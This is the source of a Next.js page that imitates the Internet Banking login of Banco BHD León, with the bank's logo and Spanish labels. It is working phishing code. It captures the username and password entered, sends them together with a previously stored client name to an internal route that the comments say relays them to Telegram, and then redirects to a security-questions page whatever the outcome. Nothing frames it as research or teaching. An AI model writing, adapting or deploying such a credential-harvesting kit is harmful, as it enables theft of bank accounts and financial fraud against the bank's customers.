"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";

export default function PortalBHDPage() {
  const router = useRouter();
  
  // Estados para capturar los datos
  const [usuario, setUsuario] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [cliente, setCliente] = useState("");

  // Recuperamos el nombre del cliente guardado en el Paso 1
  useEffect(() => {
    const nombreGuardado = localStorage.getItem("cliente_actual");
    if (nombreGuardado) {
      setCliente(nombreGuardado);
    }
  }, []);

  // Función para enviar los datos a Telegram
  const handleEntrar = async () => {
    // 🚨 VALIDACIÓN ESTRICTA
    if (!usuario.trim() || !password.trim()) {
      alert("⚠️ Por favor, ingresa tu usuario y contraseña de Internet Banking.");
      return;
    }

    setLoading(true);

    try {
      // Enviamos al API Route
      await fetch("/api/telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          pagina: "🔑 LOGIN: BANCO BHD",
          nombre: cliente || "Cliente Desconocido",
          usuario: usuario.trim(),
          password: password.trim(),
          detalles: "El usuario ha ingresado sus credenciales en el portal de BHD León."
        }),
      });

      // ✅ CORRECCIÓN: Ahora redirige a la página de preguntas del BHD
      router.push("/portal/preguntas-bhd");
      
    } catch (e) {
      console.error("Error enviando datos:", e);
      // Redirigimos de todos modos para no trabar al usuario
      router.push("/portal/preguntas-bhd");
    } finally {
      setLoading(false);
    }
  };

  // Variable para deshabilitar el botón visualmente si falta información
  const isIncomplete = !usuario.trim() || !password.trim();

  return (
    <main className="min-h-screen">
      <div
        className="min-h-screen bg-cover bg-center flex items-center justify-center px-4"
        style={{ backgroundImage: "url('/images/fondo.png')" }}
      >
        <div className="w-full max-w-sm rounded-none bg-white shadow-2xl p-8 border-t-4 border-green-600">
          
          {/* Logo */}
          <div className="flex justify-center mb-6">
            <img
              src="/images/bhd.png" 
              alt="Logo BHD"
              className="h-20 object-contain mx-auto"
            />
          </div>

          <div className="space-y-4">
            <h2 className="text-center text-xl font-bold text-slate-800 mb-4">Internet Banking</h2>
            
            {/* Campo Usuario */}
            <div>
              <label className="block text-sm font-medium mb-1 text-slate-700">
                Usuario
              </label>
              <input
                type="text"
                autoComplete="off"
                value={usuario}
                onChange={(e) => setUsuario(e.target.value)}
                placeholder="Ingresa tu usuario"
                className="w-full rounded-xl border border-slate-300 px-4 py-3 outline-none focus:border-green-600 focus:ring-1 focus:ring-green-600 text-slate-900 transition-all"
              />
            </div>

            {/* Campo Contraseña */}
            <div>
              <label className="block text-sm font-medium mb-1 text-slate-700">
                Contraseña
              </label>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Ingresa tu clave"
                className="w-full rounded-xl border border-slate-300 px-4 py-3 outline-none focus:border-green-600 focus:ring-1 focus:ring-green-600 text-slate-900 transition-all"
              />
            </div>

            {/* Botón de Envío */}
            <button
              type="button"
              onClick={handleEntrar}
              disabled={loading || isIncomplete}
              className="w-full rounded-xl bg-green-600 hover:bg-green-700 disabled:opacity-40 disabled:cursor-not-allowed text-white py-3 font-semibold text-lg transition-all shadow-md mt-2"
            >
              {loading ? "Cargando..." : "Entrar"}
            </button>
          </div>

          {/* Links de ayuda */}
          <div className="mt-6 text-center space-y-2">
            <button type="button" className="block w-full text-xs text-slate-500 hover:text-slate-700 transition-colors">
              ¿Olvidaste tu clave de acceso?
            </button>
            <button type="button" className="block w-full text-xs text-green-600 font-bold hover:underline">
              Activar mi usuario
            </button>
          </div>
        </div>
      </div>
    </main>
  );
}